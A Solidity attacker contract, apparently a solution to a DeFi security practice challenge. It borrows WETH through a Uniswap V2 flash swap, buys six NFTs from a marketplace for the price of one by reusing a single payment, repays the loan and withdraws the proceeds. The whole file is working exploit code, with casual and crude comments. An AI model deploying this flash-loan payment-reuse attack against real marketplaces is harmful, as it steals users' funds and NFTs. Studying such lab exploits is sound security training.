pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH {
    function deposit() payable external;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external;
}

interface INFTMarketplace {
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderAttacker is IERC721Receiver, IUniswapV2Callee {

    address _marketplace;
    IUniswapV2Pair private _pair;
    address payable _attacker;
    address payable router;
    address payable _weth;
    address _NFT;
    uint[] tokenIds = [0, 1, 2, 3, 4, 5];
    uint hasListedToken0 = 0;
    address _buyer;



    constructor(address marketplace, IUniswapV2Pair pair, address payable attacker, address payable weth, address NFT, address buyer) {
        _marketplace = marketplace;
        _pair = pair;
        _attacker = attacker;
        _weth = weth;
        _NFT = NFT;
        _buyer = buyer;
    }

    function attack(uint256 amountToBorrow) external {
        // it really doesn't matter what's in data tbh, it's just a flag to signal flash swaps
        IUniswapV2Pair(_pair).swap(amountToBorrow, 0, address(this), abi.encode("penis"));
    }

    // callback function
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) override external {
        // at this point we have been sent 15 WETH
        // unwrap WETH
        IWETH(_weth).withdraw(amount0);
        // for each one, we're gonna trigger the onERC721Received function
        INFTMarketplace(_marketplace).buyMany{value: amount0}(tokenIds);

        // by this point, we should have bought and transferred all of the NFTs
        // time to pay back the pair the WETH we borrowed plus any fees
        uint fee = (amount0 * 3) / 997 + 1;
        IWETH(_weth).deposit{value: amount0 + fee}();
        IWETH(_weth).transfer(address(_pair), amount0 + fee);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) override external returns (bytes4) {

        return IERC721Receiver.onERC721Received.selector;
    }

    function transferNFT() external {
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 0);
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 1);
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 2);
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 3);
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 4);
        IERC721(_NFT).safeTransferFrom(address(this), _buyer, 5);
    }

    function withdraw() external {
        require(msg.sender == _attacker, "you're not that guy pal");

        (bool sent, bytes memory data) = _attacker.call{value: address(this).balance}("");
        require(sent, "transfer of funds failed");
    }

    receive() external payable {}
}
